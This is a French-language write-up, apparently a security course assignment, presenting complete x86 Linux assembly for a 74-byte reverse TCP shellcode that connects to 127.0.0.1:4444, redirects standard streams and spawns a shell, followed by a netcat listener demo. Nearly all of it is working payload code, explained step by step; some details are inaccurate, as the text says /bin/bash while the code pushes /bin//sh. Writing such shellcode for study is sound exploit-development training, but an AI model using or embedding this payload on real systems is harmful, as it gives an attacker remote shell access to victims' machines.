# Assignement 2 #

Dans le cadre du second exercice, il est demande de réaliser un shellcode permettant d'obtenir un shell distant.

L'idée ici est dans un premier temps de créer un socket puis d'établir une connexion en indiquant une adresse IP ainsi qu'un port. Les sorties standard stdin, stdout et stderr sont redirigées afin de pouvoir être utilisées une fois la connexion établie par un shell distant. 

## Création d'un socket ##
La principal référence bibliographique est la documentation des appels systèmes http://man7.org/linux/man-pages/man2/socketcall.2.html. L'appel socketcall est utilisé pour définir les actions sur les sockets en fonction du champ call. La valeur 1 indique que c'est la création d'un socket qui nous interesse. Il s'agit ici d'indiquer un domain, un type et un protocol. Nous prenons le protocol IP de type SOCK_STREAM.

```c
	xor ebx, ebx
	mul ebx
	push ebx
	inc ebx		;socket
	push ebx
	push 0x2
	mov ecx, esp	;*args
	mov al, 0x66
	int 0x80
```
## Création de la connexion ##
Nous procédons de la même manière pour créer la connexion en indiquant l'adresse IP et le port logique. Nous nous sommes appuyé sur la structure sockaddr afin de connaître les différents élément necessaires.

```c
	push 0x0101017f	; @Ip 127.0.0.1
	push dword 0x5c11 ; Port 4444
	inc ebx
    	push word bx      ; Ajout de AF_INET et pour eviter d'avoir un null byte
    	mov ecx, esp	
	push 0x10	; addrlen
	push ecx	; struct *addr
	push edx	; sockfd
	mov bl, 0x3	; connect call
	mov ecx, esp	
	mov al, 0x66
	int 0x80
```

## Redirection ##

Ici, nous redirigeons les 3 sorties vers le socket via l'appel système dup2.

```c
	xor ecx, ecx
	mov cl, 0x2
_:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns _

```

## Exécution du shell ##
Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.

```c
	xor ecx, ecx
	mov edx, ecx
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	int 0x80
```



## Code complet ##

```c
; Shell_reverse_Tcp shellcode
; Author: Alain Menelet
; Taille : 74 bytes
; 2017


global _start

section .text

_start:

	; Création du socket
	; http://man7.org/linux/man-pages/man2/socketcall.2.html
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	
	; for domain we use AF_INET(0x2)
	; for type SOCK_STREAM(0x1)
	; for protocol IP (0x0)	

	xor ebx, ebx
	mul ebx
	push ebx
	inc ebx		;socket
	push ebx
	push 0x2
	mov ecx, esp	;*args
	mov al, 0x66
	int 0x80

	; we need to save the result of socket function for later usage

	xchg edx, eax

	; création de la connexion
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; we save sockfd just before
	; sockaddr structure

	push 0x0101017f	; @Ip 127.0.0.1
	push dword 0x5c11 ; Port 4444
	inc ebx
    push word bx      ; Ajout de AF_INET et pour eviter d'avoir un null byte
    mov ecx, esp	
	push 0x10	; addrlen
	push ecx	; struct *addr
	push edx	; sockfd
	mov bl, 0x3	; connect call
	mov ecx, esp	
	mov al, 0x66
	int 0x80

	
	; redirection des flux via dup
	; nous allons rediriger les sorties standards vers notre socket
	; int dup2(int oldfd, int newfd);

	xor ecx, ecx
	mov cl, 0x2
_:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns _
	

	; execve
	; execute un shell /bin/bash des la connexion réussie

	xor ecx, ecx
	mov edx, ecx
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	int 0x80	

```

## Exécution ##

Sur le premier terminal:
```
./shellcode.c
```

Sur le second terminal: 
```c
nc -l -p 4444 -v
pwd
/home/xophidia
```